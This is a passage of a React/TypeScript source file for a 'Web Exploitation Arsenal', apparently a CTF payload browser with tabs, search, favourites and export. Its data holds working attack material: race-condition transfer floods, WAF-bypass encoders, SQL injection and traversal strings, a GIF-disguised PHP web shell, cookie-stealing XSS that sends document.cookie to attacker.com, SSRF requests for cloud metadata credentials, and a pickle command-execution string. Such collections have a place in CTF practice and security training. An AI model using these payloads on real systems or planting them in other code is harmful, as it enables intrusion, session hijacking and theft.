      payload: "for i in {1..20}; do curl -X POST https://api.com/transfer -d 'amount=100&to=attacker' & done; wait",
      description: "Send parallel requests to exploit race window",
      usage: "Bash script for concurrent request flooding"
    },
    {
      name: "Single-Packet Attack",
      category: "TCP",
      payload: "Use Turbo Intruder with single-packet-attack technique",
      description: "Send requests in single TCP packet to reduce race window",
      usage: "Minimize network latency for tight race conditions"
    },
    {
      name: "Discount Code Race",
      category: "Business Logic",
      payload: "POST /apply-discount\\r\\ncode=SAVE50\\r\\n(send 50 times simultaneously)",
      description: "Apply single-use discount code multiple times",
      usage: "Exploit lack of atomic operations"
    },
    {
      name: "Password Reset Token Race",
      category: "Authentication",
      payload: "Request password reset, then verify token multiple times in parallel",
      description: "Exploit race in token invalidation logic",
      usage: "Reuse tokens before invalidation completes"
    },
    {
      name: "Balance Check Race",
      category: "Financial",
      payload: "POST /purchase (amount > balance) + POST /purchase (amount > balance) simultaneously",
      description: "Purchase items exceeding balance via race",
      usage: "TOCTOU between balance check and deduction"
    }
  ]

  // Advanced Encoding & Obfuscation Tools
  const encodingTools = {
    // WAF Bypass Encoder
    wafBypassEncoder: (payload: string, level: 'low' | 'medium' | 'high' = 'medium') => {
      switch (level) {
        case 'low':
          return payload.replace(/select/gi, 'SeLeCt').replace(/union/gi, 'UnIoN')
        case 'medium':
          return payload
            .replace(/select/gi, 'SEL/**/ECT')
            .replace(/union/gi, 'UNI/**/ON')
            .replace(/from/gi, 'FR/**/OM')
            .replace(/where/gi, 'WH/**/ERE')
        case 'high':
          return encodeURIComponent(
            payload
              .replace(/select/gi, 'SEL/**/ECT')
              .replace(/union/gi, 'UNI/**/ON')
              .replace(/ /g, '/**/')
              .split('')
              .map((char, i) => i % 3 === 0 ? char.toUpperCase() : char.toLowerCase())
              .join('')
          )
        default:
          return payload
      }
    },

    // Unicode Encoder
    unicodeEncoder: (payload: string) => {
      return payload
        .split('')
        .map(char => {
          const code = char.charCodeAt(0)
          if (code < 128) {
            // Convert to fullwidth Unicode equivalent where possible
            const fullwidthMap: { [key: string]: string } = {
              'A': 'Ａ', 'B': 'Ｂ', 'C': 'Ｃ', 'D': 'Ｄ', 'E': 'Ｅ', 'F': 'Ｆ',
              'G': 'Ｇ', 'H': 'Ｈ', 'I': 'Ｉ', 'J': 'Ｊ', 'K': 'Ｋ', 'L': 'Ｌ',
              'M': 'Ｍ', 'N': 'Ｎ', 'O': 'Ｏ', 'P': 'Ｐ', 'Q': 'Ｑ', 'R': 'Ｒ',
              'S': 'Ｓ', 'T': 'Ｔ', 'U': 'Ｕ', 'V': 'Ｖ', 'W': 'Ｗ', 'X': 'Ｘ',
              'Y': 'Ｙ', 'Z': 'Ｚ', '(': '（', ')': '）', '<': '＜', '>': '＞'
            }
            return fullwidthMap[char.toUpperCase()] || char
          }
          return char
        })
        .join('')
    },

    // Double Encoding
    doubleEncoder: (payload: string) => {
      return encodeURIComponent(encodeURIComponent(payload))
    },

    // HTML Entity Encoder
    htmlEntityEncoder: (payload: string) => {
      return payload
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;')
    },

    // Base64 Chunks
    base64ChunkEncoder: (payload: string) => {
      const base64 = btoa(payload)
      const chunks = base64.match(/.{1,4}/g) || []
      return chunks.join('.')
    }
  }

  // CTF Techniques
  const ctfTechniques: Technique[] = [
    {
      name: "SQL Injection Methodology",
      category: "SQL Injection",
      description: "Systematic approach to identifying and exploiting SQL injection vulnerabilities in CTF challenges",
      steps: [
        "Test for injection points with single quotes (') and observe errors",
        "Determine number of columns using ORDER BY or UNION SELECT",
        "Identify output locations with UNION SELECT",
        "Enumerate database structure (tables, columns)",
        "Extract sensitive data (flags, credentials)",
        "Try different SQL comment syntaxes (-- vs # vs /**/)"
      ],
      examples: [
        "?id=1' ORDER BY 5-- (test column count)",
        "?id=1' UNION SELECT 1,2,3,4,5-- (test output)",
        "?id=1' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables--"
      ]
    },
    {
      name: "File Upload Bypass Techniques",
      category: "File Upload",
      description: "Methods to bypass file upload restrictions in web applications",
      steps: [
        "Try different file extensions (.php, .php3, .php4, .php5, .phtml, .phar)",
        "Use double extensions (shell.php.jpg, shell.jpg.php)",
        "Modify MIME type in Content-Type header",
        "Add magic bytes/file signatures to bypass content validation",
        "Try case variations (Shell.PHP vs shell.php)",
        "Use null byte injection (shell.php%00.jpg) in older systems"
      ],
      examples: [
        "shell.php5 (alternative PHP extension)",
        "GIF89a<?php system($_GET['cmd']); ?> (GIF header + PHP)",
        "Content-Type: image/jpeg (fake MIME type)"
      ]
    },
    {
      name: "Authentication Bypass Methods",
      category: "Authentication",
      description: "Common authentication bypass techniques in CTF challenges",
      steps: [
        "Test for SQL injection in login forms",
        "Try default credentials (admin/admin, admin/password)",
        "Check for session prediction or fixation",
        "Look for JWT vulnerabilities (algorithm confusion, weak secret)",
        "Test for password reset token weaknesses",
        "Try parameter pollution (user=admin&user=guest)"
      ],
      examples: [
        "username: admin' OR '1'='1'-- password: anything",
        "JWT algorithm none attack: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=",
        "Session ID: Try incrementing or predictable patterns"
      ]
    },
    {
      name: "Directory Traversal Exploitation",
      category: "Directory Traversal",
      description: "Techniques for exploiting path traversal vulnerabilities",
      steps: [
        "Start with basic ../../../etc/passwd",
        "Try different encoding methods (%2e%2e%2f, ..%2f, %2e%2e/)",
        "Use absolute paths (/etc/passwd, \\windows\\system32\\drivers\\etc\\hosts)",
        "Try different OS paths (Linux vs Windows)",
        "Combine with null bytes if applicable (%00)",
        "Look for interesting files (config files, logs, source code)"
      ],
      examples: [
        "..%2f..%2f..%2fetc%2fpasswd (URL encoded)",
        "/proc/self/environ (process environment)",
        "../../../var/log/apache2/access.log (log files)"
      ]
    },
    {
      name: "XSS to Session Hijacking",
      category: "XSS",
      description: "Converting XSS findings into session hijacking attacks",
      steps: [
        "Identify XSS injection point (reflected, stored, DOM)",
        "Test basic payload execution <script>alert(1)</script>",
        "Create payload to steal cookies: document.cookie",
        "Set up listener server to receive stolen sessions",
        "Craft final payload: <script>fetch('http://attacker.com/?c='+document.cookie)</script>",
        "Use stolen session to impersonate victim"
      ],
      examples: [
        "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>",
        "<script>window.location='http://attacker.com/?c='+document.cookie</script>",
        "Stored XSS in profile field for persistent attacks"
      ]
    },
    {
      name: "SSRF to Internal Service Access",
      category: "SSRF",
      description: "Using Server-Side Request Forgery to access internal services",
      steps: [
        "Identify SSRF vulnerable parameter (URL fetching functionality)",
        "Test with external collaborator (http://burpcollaborator.com)",
        "Try localhost access (http://127.0.0.1, http://localhost)",
        "Port scan internal services (127.0.0.1:22, 127.0.0.1:3306)",
        "Access cloud metadata (http://169.254.169.254/latest/meta-data/)",
        "Try different protocols (file://, gopher://, dict://)"
      ],
      examples: [
        "http://127.0.0.1:6379 (Redis access)",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS)",
        "file:///etc/passwd (local file read)"
      ]
    },
    {
      name: "Deserialization Attack Chains",
      category: "Deserialization",
      description: "Exploiting insecure deserialization vulnerabilities",
      steps: [
        "Identify serialized data (PHP serialize, Java serialization, Python pickle)",
        "Analyze application to find deserialization points",
        "Create malicious serialized object with command execution",
        "Look for magic methods that trigger during deserialization",
        "Chain multiple objects for complex exploitation",
        "Test with different payloads (command execution, file write)"
      ],
      examples: [
        "PHP: O:4:\"User\":1:{s:4:\"name\";s:5:\"admin\";}",
        "Java: Use ysoserial for gadget chain generation",
        "Python pickle: cos\\nsystem\\n(S'whoami'\\ntR."
      ]
    },
    {
      name: "Race Condition Exploitation",
      category: "Race Conditions",
      description: "Exploiting timing-based vulnerabilities in web applications",
      steps: [
        "Identify potential race condition scenarios (file uploads, transactions)",
        "Use multiple threads/requests simultaneously",
        "Time requests precisely to exploit check-to-use gaps", 
        "Focus on file operations, database transactions, session handling",
        "Use tools like Burp Intruder or custom scripts",
        "Look for temporary file creation/deletion races"
      ],
      examples: [
        "Concurrent file upload during validation check",
        "Multiple password reset requests for same user",
        "Simultaneous withdrawal requests in banking apps"
      ]
    }
  ]

  // Filter payloads based on search and category
  const filterPayloads = (payloads: Payload[]) => {
    return payloads.filter(payload => {
      const matchesSearch = payload.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
                          payload.payload.toLowerCase().includes(searchTerm.toLowerCase()) ||
                          payload.description.toLowerCase().includes(searchTerm.toLowerCase())
      const matchesCategory = selectedCategory === 'all' || payload.category === selectedCategory
      const matchesFavorites = !showFavoritesOnly || isFavorite(`${payload.category}-${payload.name}`)
      return matchesSearch && matchesCategory && matchesFavorites
    })
  }

  const copyToClipboard = (text: string, name: string = 'Payload') => {
    navigator.clipboard.writeText(text)
  }

  const toggleFavorite = (payloadKey: string) => {
    if (favorites.includes(payloadKey)) {
      setFavorites(favorites.filter(f => f !== payloadKey))
    } else {
      setFavorites([...favorites, payloadKey])
    }
  }

  const isFavorite = (payloadKey: string) => {
    return favorites.includes(payloadKey)
  }

  const exportPayloads = () => {
    const allPayloads = [...sqlPayloads, ...xssPayloads, ...rcePayloads, ...lfiPayloads, ...sstiPayloads, ...xxePayloads, ...csrfPayloads]
    const payloadData = JSON.stringify(allPayloads, null, 2)
    const blob = new Blob([payloadData], { type: 'application/json' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = 'ctf_payloads.json'
    document.body.appendChild(a)
    a.click()
    document.body.removeChild(a)
    URL.revokeObjectURL(url)
  }

  const renderPayloadCard = (payload: Payload) => {
    const payloadKey = `${payload.category}-${payload.name}`
    return (
      <Card key={payloadKey} className="p-4 space-y-3">
        <div className="flex items-center justify-between">
          <h3 className="font-semibold text-accent">{payload.name}</h3>
          <div className="flex items-center gap-2">
            <Button
              size="sm"
              variant="ghost"
              onClick={() => toggleFavorite(payloadKey)}
              className="h-6 w-6 p-0"
            >
              <Star className={`h-3 w-3 ${isFavorite(payloadKey) ? 'fill-yellow-500 text-yellow-500' : ''}`} />
            </Button>
            <span className="px-2 py-1 bg-muted rounded text-xs">{payload.category}</span>
          </div>
        </div>
        <p className="text-sm text-muted-foreground">{payload.description}</p>
        <div className="space-y-2">
          <div className="bg-background rounded p-2 font-mono text-sm break-all">
            {payload.payload}
          </div>
          <div className="flex items-center justify-between">
            <span className="text-xs text-muted-foreground">{payload.usage}</span>
            <Button
              size="sm"
              variant="outline"
              onClick={() => copyToClipboard(payload.payload, payload.name)}
              className="h-6"
            >
              <Copy className="h-3 w-3" />
            </Button>
          </div>
        </div>
      </Card>
    )
  }

  const getCurrentPayloads = () => {
    let payloads: Payload[] = []

    switch (activeTab) {
      case 'sqli': payloads = sqlPayloads; break
      case 'xss': payloads = xssPayloads; break
      case 'rce': payloads = rcePayloads; break
      case 'lfi': payloads = lfiPayloads; break
      case 'ssti': payloads = sstiPayloads; break
      case 'xxe': payloads = xxePayloads; break
      case 'csrf': payloads = csrfPayloads; break
      case 'ssrf': payloads = ssrfPayloads; break
      case 'nosql': payloads = nosqlPayloads; break
      case 'graphql': payloads = graphqlPayloads; break
      case 'jwt': payloads = jwtPayloads; break
      case 'directory': payloads = directoryWordlists; break
      case 'fingerprint': payloads = fingerprintingTechniques; break
      case 'cms': payloads = cmsPayloads; break
      case 'api': payloads = apiDiscoveryPayloads; break
      case 'waf': payloads = wafBypassPayloads; break
      case 'polyglot': payloads = polyglotPayloads; break
      case 'deserialization': payloads = deserializationPayloads; break
      case 'smuggling': payloads = smugglingPayloads; break
      case 'oauth': payloads = oauthPayloads; break
      case 'websocket': payloads = websocketPayloads; break
      case 'prototype': payloads = prototypePayloads; break
      case 'cache': payloads = cachePayloads; break
      case 'race': payloads = racePayloads; break
      default: payloads = []
    }

    // Filter payloads
    let filtered = filterPayloads(payloads)

    // Filter by favorites if enabled
    if (showFavoritesOnly) {
      filtered = filtered.filter(p => isFavorite(`${p.category}-${p.name}`))
    }

    return filtered
  }

  const getCurrentCategories = () => {
    const payloads = getCurrentPayloads()
    const categories = [...new Set(payloads.map(p => p.category))]
    return ['all', ...categories]
  }

  return (
    <div className="p-6 space-y-6">
      {/* Header */}
      <div className="text-center space-y-2">
        <h1 className="text-4xl font-bold text-foreground flex items-center justify-center space-x-3">
          <Globe className="w-10 h-10 text-accent" />
          <span>Web Exploitation Arsenal</span>
        </h1>
        <p className="text-muted-foreground text-lg">
          Collection of web exploitation payloads and techniques for CTF competitions
        </p>
      </div>

      {/* Search and Filter Controls */}
      <Card className="p-4">
        <div className="flex flex-col md:flex-row gap-4 items-center">
          <div className="flex-1">
            <Input
              type="text"
              placeholder="Search payloads, descriptions, or techniques..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="w-full"
            />
          </div>
          <div className="flex items-center gap-2 flex-wrap">
            <select
              value={selectedCategory}
              onChange={(e) => setSelectedCategory(e.target.value)}
              className="px-3 py-2 bg-background border border-border rounded text-sm min-w-[180px]"
            >
              {getCurrentCategories().map(category => (
                <option key={category} value={category}>
                  {category === 'all' ? 'All Categories' : category}
                </option>
              ))}
            </select>
            <Button
              onClick={() => setShowFavoritesOnly(!showFavoritesOnly)}
              variant={showFavoritesOnly ? "default" : "outline"}
              size="sm"
            >
              <Star className={`h-4 w-4 mr-2 ${showFavoritesOnly ? 'fill-current' : ''}`} />
              Favorites
            </Button>
            <Button
              onClick={exportPayloads}
              variant="outline"
              size="sm"
            >
              <Download className="h-4 w-4 mr-2" />
              Export
            </Button>
          </div>
        </div>
      </Card>

      {/* Main Content Tabs */}
      {/* Main Content Tabs */}
      <div className="bg-card border border-border rounded-lg">
        <div className="flex flex-wrap items-center gap-1 border-b border-border p-2 overflow-x-auto">
          <button onClick={() => setActiveTab('sqli')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'sqli' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Database className="h-4 w-4" />
            <span className="text-xs">SQL</span>
          </button>
          <button onClick={() => setActiveTab('xss')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'xss' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Code className="h-4 w-4" />
            <span className="text-xs">XSS</span>
          </button>
          <button onClick={() => setActiveTab('rce')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'rce' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Terminal className="h-4 w-4" />
            <span className="text-xs">RCE</span>
          </button>
          <button onClick={() => setActiveTab('lfi')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'lfi' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <FileCode className="h-4 w-4" />
            <span className="text-xs">LFI</span>
          </button>
          <button onClick={() => setActiveTab('ssti')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'ssti' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Zap className="h-4 w-4" />
            <span className="text-xs">SSTI</span>
          </button>
          <button onClick={() => setActiveTab('xxe')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'xxe' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Bug className="h-4 w-4" />
            <span className="text-xs">XXE</span>
          </button>
          <button onClick={() => setActiveTab('csrf')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'csrf' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Shield className="h-4 w-4" />
            <span className="text-xs">CSRF</span>
          </button>
          <button onClick={() => setActiveTab('ssrf')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'ssrf' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Server className="h-4 w-4" />
            <span className="text-xs">SSRF</span>
          </button>
          <button onClick={() => setActiveTab('nosql')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'nosql' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Database className="h-4 w-4" />
            <span className="text-xs">NoSQL</span>
          </button>
          <button onClick={() => setActiveTab('graphql')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'graphql' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Code className="h-4 w-4" />
            <span className="text-xs">GraphQL</span>
          </button>
          <button onClick={() => setActiveTab('jwt')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'jwt' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Lock className="h-4 w-4" />
            <span className="text-xs">JWT</span>
          </button>
          <button onClick={() => setActiveTab('directory')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'directory' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <FolderOpen className="h-4 w-4" />
            <span className="text-xs">Dir Enum</span>
          </button>
          <button onClick={() => setActiveTab('fingerprint')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'fingerprint' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Search className="h-4 w-4" />
            <span className="text-xs">Fingerprint</span>
          </button>
          <button onClick={() => setActiveTab('cms')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'cms' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Globe className="h-4 w-4" />
            <span className="text-xs">CMS</span>
          </button>
          <button onClick={() => setActiveTab('api')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'api' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Server className="h-4 w-4" />
            <span className="text-xs">API</span>
          </button>
          <button onClick={() => setActiveTab('waf')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'waf' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Shield className="h-4 w-4" />
            <span className="text-xs">WAF Bypass</span>
          </button>
          <button onClick={() => setActiveTab('polyglot')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'polyglot' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Zap className="h-4 w-4" />
            <span className="text-xs">Polyglot</span>
          </button>
          <button onClick={() => setActiveTab('deserialization')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'deserialization' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <FileJson className="h-4 w-4" />
            <span className="text-xs">Deserialization</span>
          </button>
          <button onClick={() => setActiveTab('smuggling')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'smuggling' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <GitBranch className="h-4 w-4" />
            <span className="text-xs">Smuggling</span>
          </button>
          <button onClick={() => setActiveTab('oauth')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'oauth' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Key className="h-4 w-4" />
            <span className="text-xs">OAuth/SAML</span>
          </button>
          <button onClick={() => setActiveTab('websocket')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'websocket' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Radio className="h-4 w-4" />
            <span className="text-xs">WebSocket</span>
          </button>
          <button onClick={() => setActiveTab('prototype')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'prototype' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Boxes className="h-4 w-4" />
            <span className="text-xs">Prototype</span>
          </button>
          <button onClick={() => setActiveTab('cache')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'cache' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Cloud className="h-4 w-4" />
            <span className="text-xs">Cache</span>
          </button>
          <button onClick={() => setActiveTab('race')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'race' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Zap className="h-4 w-4" />
            <span className="text-xs">Race</span>
          </button>
          <button onClick={() => setActiveTab('encoding')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'encoding' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Code className="h-4 w-4" />
            <span className="text-xs">Encode</span>
          </button>
          <button onClick={() => setActiveTab('techniques')} className={`flex items-center space-x-2 px-3 py-2 rounded-t-lg transition-colors ${activeTab === 'techniques' ? 'text-accent border-b-2 border-accent bg-accent/5' : 'text-muted-foreground hover:text-foreground hover:bg-accent/5'}`}>
            <Eye className="h-4 w-4" />
            <span className="text-xs">Guide</span>
          </button>
        </div>

        <div className="p-4 space-y-4">

        {/* SQL Injection Payloads */}
        {activeTab === 'sqli' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Database className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">SQL Injection Payloads</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {filterPayloads(sqlPayloads).length}
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filterPayloads(sqlPayloads).map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* XSS Payloads */}
        {activeTab === 'xss' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Code className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">Cross-Site Scripting (XSS)</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {filterPayloads(xssPayloads).length}
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filterPayloads(xssPayloads).map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* RCE Payloads */}
        {activeTab === 'rce' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Terminal className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">Remote Code Execution (RCE)</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {filterPayloads(rcePayloads).length}
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filterPayloads(rcePayloads).map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* LFI Payloads */}
        {activeTab === 'lfi' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <FileCode className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">Local File Inclusion (LFI)</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {filterPayloads(lfiPayloads).length}
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filterPayloads(lfiPayloads).map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* SSTI Payloads */}
        {activeTab === 'ssti' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Zap className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">Server-Side Template Injection (SSTI)</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {filterPayloads(sstiPayloads).length} payloads
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filterPayloads(sstiPayloads).map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* XXE Payloads */}
        {activeTab === 'xxe' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Bug className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">XML External Entity (XXE)</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {filterPayloads(xxePayloads).length} payloads
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filterPayloads(xxePayloads).map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* CSRF Payloads */}
        {activeTab === 'csrf' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Shield className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">Cross-Site Request Forgery (CSRF)</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {filterPayloads(csrfPayloads).length} payloads
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filterPayloads(csrfPayloads).map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* SSRF Payloads */}
        {activeTab === 'ssrf' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Server className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">Server-Side Request Forgery (SSRF)</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {filterPayloads(ssrfPayloads).length} payloads
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filterPayloads(ssrfPayloads).map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* NoSQL Injection */}
        {activeTab === 'nosql' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Database className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">NoSQL Injection</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {filterPayloads(nosqlPayloads).length} payloads
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filterPayloads(nosqlPayloads).map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* GraphQL Payloads */}
        {activeTab === 'graphql' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Code className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">GraphQL Attacks</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {filterPayloads(graphqlPayloads).length} payloads
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filterPayloads(graphqlPayloads).map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* JWT Manipulation Payloads */}
        {activeTab === 'jwt' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Lock className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">JWT Manipulation</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {filterPayloads(jwtPayloads).length} techniques
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filterPayloads(jwtPayloads).map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* Directory Enumeration */}
        {activeTab === 'directory' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <FolderOpen className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">Directory Enumeration</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {filterPayloads(directoryWordlists).length}
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filterPayloads(directoryWordlists).map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* Technology Fingerprinting */}
        {activeTab === 'fingerprint' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
            <Search className="h-6 w-6 text-accent" />
            <h2 className="text-2xl font-bold text-foreground">Technology Fingerprinting</h2>
            <span className="px-3 py-1 bg-accent/20 text-accent rounded-full text-sm font-medium">
              {filterPayloads(fingerprintingTechniques).length}
            </span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filterPayloads(fingerprintingTechniques).map(renderPayloadCard)}
          </div>
          </div>
        )}

        {/* CMS Detection */}
        {activeTab === 'cms' && (
          <div>
          <div className="flex items-center justify-center gap-2 mb-6">
